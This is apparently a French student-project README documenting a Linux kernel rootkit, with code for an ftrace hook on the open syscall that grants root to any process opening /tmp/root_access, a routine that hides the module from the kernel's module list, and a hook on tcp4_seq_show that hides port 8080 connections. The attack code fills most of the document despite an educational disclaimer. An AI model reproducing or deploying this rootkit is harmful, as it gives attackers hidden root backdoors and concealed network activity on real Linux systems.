# Projet RootKit 2600 Groupe 6

Disclaimer :
Ce code est fourni à des fins strictement éducatives. L’utilisation de ces techniques dans un but malveillant peut violer les lois ou politiques informatiques. Assurez-vous de respecter l’éthique et les règles en vigueur.

# Documentation : Module Linux en C - Hide LKM
Ce fichier C est un module noyau Linux (LKM - Linux Kernel Module) qui illustre des concepts avancés tels que le **hooking de syscall**, la manipulation de permissions, et l'utilisation de la bibliothèque `ftrace`. L'objectif éducatif est de comprendre comment un module peut intercepter des appels systèmes (syscalls) pour modifier ou ajouter des comportements spécifiques.

---

## Sections principales du code

## Main.c

### 1. **Compatibilité avec les verison du noyau**
```c
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif
```
Vérifie si le système est 64 bits et utilise un noyau d’au moins la version 4.17.0.
La calling convention à changer depuis la version 4.17.0 il est donc important de la vérifier.

Définit le macro `PTREGS_SYSCALL_STUBS` pour s’assurer que les hooks sont compatibles avec les stubs des syscalls modernes.

### 2. Définition des hooks
```c
static asmlinkage long (*orig_open)(const struct pt_regs *);
asmlinkage int hook_open(const struct pt_regs *regs);
void set_root(void);
```
Interception du syscall open

- `orig_open` : Pointeur vers la fonction système originale. Cela permet de la réutiliser après interception.
- `hook_open` : Nouvelle implémentation du syscall open, appelée à la place de l’original.
- `set_root` : Permet d'élever les privilèges d’un processus pour lui donner les droits root.

Implémentation de la fonction `hook_open` :
```c
asmlinkage int hook_open(const struct pt_regs *regs)
{
    char __user *filename = (char *) regs->di;

    if (strcmp(filename, "/tmp/root_access") == 0)
    {
        printk(KERN_INFO "rootkit: Giving root privilege ...\n");
        set_root();
        return 0;
    }

    return orig_open(regs);
}
``` 

- Vérifie si l’utilisateur tente d’accéder au fichier /tmp/root_access.
- Si oui, élève les privilèges de l’utilisateur en appelant set_root().
- Si non, l’exécution est déléguée à la fonction système originale via orig_open.

### 3. Privilege Escalation
La fonction set_root modifie les informations d'identité du processus courant.
```c
void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}
```

`prepare_creds` : Prépare une nouvelle structure de credentials.
UID/GID à 0 : Les valeurs 0 soit root.
`commit_creds` : Applique les nouvelles permissions.

### 4. Init et Clean
**Initialisaiton :**
```c
static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    return 0;
}
```
`fh_install_hooks` : Installe les hooks définis.
Retourne une erreur si l’installation échoue.

**Cleaning**
```c
static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
```
`fh_remove_hooks` : Supprime les hooks installés pour restaurer le comportement d’origine.

## hide_lkm.c
### 1. Variables globales et structures
Liste chaînée pour masquer un module:
```c
static struct list_head *prev_module;
static short hidden = 0;
```
`prev_module` : Pointeur vers l’élément précédent dans la liste des modules. Nécessaire pour réinsérer correctement le module après l'avoir masqué.
`hidden` : Indicateur d’état du module :
    `0` : Le module est visible.
    `1` : Le module est caché.

**Structures liées**

    `list_head` : Une structure de liste doublement chaînée utilisée par le noyau Linux. Elle permet d’ajouter ou de supprimer dynamiquement des éléments dans des listes.

### 2. Fonction principales
**showme**
```c
void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}
```
Réaffiche le module en le réintegrant dans `list_head` avec hidden set à `0`.

**hideme**
```c
void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}
```
Masque le module en le retirant de `list_head` avec hidden set à `1`.

## 4. Initialisation et Cleaning
Comme pour notre module de priv_esc l'init et l'exit marche de la même manière pour le hide.
**Init**
```c
static int __init rootkit_init(void)
{
    hideme();
    return 0;
}
```

**Exit**
```c
static void __exit rootkit_exit(void)
{
    showme();
}
```
## hide_port.c
Masquage des ports avec ftrace, ce code est compatible avec les versions du kernel ultérieur à 5.7.

### 1. Hooking Ftrace
```c
struct ftrace_hook {
    const char *name;     // Nom de la fonction cible
    void *function;       // Nouvelle fonction (hook)
    void *original;       // Pointeur vers la fonction d'origine
    unsigned long address; // Adresse résolue de la fonction cible
    struct ftrace_ops ops; // Options ftrace
};
```
Structure utilisé pour décrire les hook interceptant les syscall.

**MACRO `hook`**
```c
#define HOOK(_name, _function, _original) \
    {                                     \
        .name = (_name),                  \
        .function = (_function),          \
        .original = (_original),          \
    }
```
Permet de hook facilement

### 2. Résolution des adresses avec kprobes
`fh_resolve_hook_address`
```c
static int fh_resolve_hook_address(struct ftrace_hook *hook)
```
Objectif : Résout l’adresse de la fonction à intercepter (par exemple, tcp4_seq_show).
Étapes :

    Utilise un kprobe pour initialiser `kallsyms_lookup_name`, une fonction interne du noyau.
    Appelle `kallsyms_lookup_name` pour obtenir l’adresse de la fonction cible et l’enregistre dans hook->address.

### 3. Installation et supression des hooks

Installe un hook a un syscall
```c
int fh_install_hook(struct ftrace_hook *hook)
```
Etapes :
1. Résout 'adresse de la fonction cible via `fh_resolve_hook_address`.
2. Configure `ftrace_ops` pour rediriger l'exécution.
3. Ajoute le filtre avec `ftrace_set_filter_ip` et enregistre le hook avec `register_ftrace_function`.

Supression d'un hook
```c
void fh_remove_hook(struct ftrace_hook *hook)
```
Désinstalle un hook en :
1. Supprimant le filtre.
2. Désenregistrant la redirection.

Ces 2 fonction supporte la gestion multiple de hook selons nous car `fh_install_hooks` et ``h_remove_hooks`` gère des tableaux.

### 4. Hook spécifique : Masquage des connexions
``hook_tcp4_seq_show`` :
```c
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    if (sk != NULL) {
        if (sk->sk_num == 8080) { // Port 8080
            printk(KERN_INFO "[+] rootkit: Masquage de la connexion sur le port 8080\n");
            return 0;
        }
    }

    return orig_tcp4_seq_show(seq, v);
}
```
Cible **tcp4_seq_show**
Affiches les connexions TCP via `/proc/net/tcp`

1. Vérifie si la connexion correspond au port 8080 (sk->sk_num == 8080).
2. Si oui, renvoie 0 pour ignorer l’affichage de cette connexion.
3. Sinon, appelle la fonction d’origine.

